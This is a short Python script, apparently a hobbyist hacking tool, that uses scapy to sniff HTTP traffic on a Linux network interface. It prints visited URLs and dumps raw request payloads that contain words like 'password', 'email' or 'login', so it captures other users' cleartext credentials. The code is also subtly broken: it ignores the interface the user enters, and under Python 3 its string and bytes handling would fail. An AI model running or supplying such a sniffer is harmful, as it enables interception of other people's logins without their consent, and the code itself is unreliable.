import scapy.all as scapy
from scapy.layers import http

def sniff(interface):#false kodutha store ahathu
    scapy.sniff(iface=interface,store=False,prn=print_sniffed_packets)#call back function prn,,

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path

def get_user_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["email", "username", "password", "login", "user"]
        for keyword in keywords:
            if keyword in load:
                return load

def print_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print("link>>"+url)

        password=get_user_info(packet)
        if password:
            print("password>>"+password)

print("""
 ##--------------------------------------------##
 #|                                            |#
 #|       **** LINUX ONLY ****                 |#
 #|                                            |#
 #|      DATA SNIFFING(HTTP)>>                 |#
 #|                  BY.....                   |#
 #|                                            |#
 #|                    |*| cyber_jawahar       |#
 #|                                            |#
 ##--------------------------------------------##\n
 """)


a=input("enter the interface (wlan0)>>>>")
sniff("wlp2s0")